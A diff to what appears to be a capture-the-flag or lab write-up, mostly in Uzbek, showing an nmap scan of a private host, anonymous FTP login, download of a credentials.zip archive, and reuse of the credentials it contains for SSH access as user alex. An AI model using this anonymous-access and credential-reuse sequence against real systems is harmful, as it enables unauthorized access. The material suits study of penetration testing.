@@ -1,4 +1,49 @@
-Vazifa 10.15.0.73 ushbu ip manzil bizga berilgan edi ssh uchun .
+──(onyx㉿kali)-[~]
+└─$ nmap -sV 10.15.0.121
+
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-28 20:05 +0500
+Nmap scan report for 10.15.0.121
+Host is up (0.053s latency).
+Not shown: 996 filtered tcp ports (no-response)
+PORT      STATE  SERVICE VERSION
+21/tcp    open   ftp     vsftpd 3.0.5
+22/tcp    open   ssh     OpenSSH 10.2p1 Ubuntu 2ubuntu3.2 (Ubuntu Linux; protocol 2.0)
+80/tcp    open   http    nginx 1.28.3 (Ubuntu)
+30000/tcp closed ndmps
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.45 seconds
+
+─(onyx㉿kali)-[~]
+└─$ ftp -A 10.15.0.121
+Connected to 10.15.0.121.
+220 (vsFTPd 3.0.5)
+Name (10.15.0.121:onyx): anonymous
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls -la
+500 Illegal PORT command.
+ftp: Can't bind for data connection: Address already in use
+ftp> ls -la
+500 Illegal PORT command.
+ftp> passive
+Passive mode: on; fallback to active mode: on.
+
+ls -la
+
+get credentials.zip
+
+exit
+
+unzip credentials.zip
+
+ichida fayl boladi . Uni o’qib ichidagi malumot login/parolni olamiz
+
+cat <ichidagi fayl nomi> 
+
+va login/parol va ulanish uchun IP beradi u IP bilan SSH qilib ulanasiz
 ─(onyx㉿kali)-[~]
 └─$ ssh alex@10.15.0.73
 alex@10.15.0.73's password:
